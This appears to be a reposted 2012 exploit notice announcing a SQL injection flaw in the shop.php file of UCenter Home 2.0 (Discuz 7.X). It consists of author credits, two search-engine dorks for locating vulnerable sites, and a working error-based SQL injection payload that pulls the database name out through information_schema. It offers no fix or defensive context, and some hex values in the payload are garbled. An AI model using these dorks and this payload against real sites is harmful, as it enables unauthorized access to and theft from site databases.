@@ -1,0 +1,20 @@
+Discuz7.X通杀0day漏洞(UCenter Home-2.0)
+
+2012年7月16日
+评论发表评论
+
+
+
+ 
+*/ Author : KnocKout
+ */ Greatz : DaiMon,BARCOD3,RiskY and iranian hackers
+ */ Contact: knockoutr@msn.com
+ */ Cyber-Warrior.org/CWKnocKout
+ Dork : Powered by UCenter inurl:shop.php?ac=view
+ Dork 2 : inurl:shop.php?ac=view&amp;shopid=
+ Vuln file : Shop.php
+ 
+===================================================================
+ 利用POC
+ 
+shop.php?ac=view&shopid=4 and (select 1 from(select count(*),concat((select (select concat(0x7e,0×27,unhex(hex(database())),0×27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
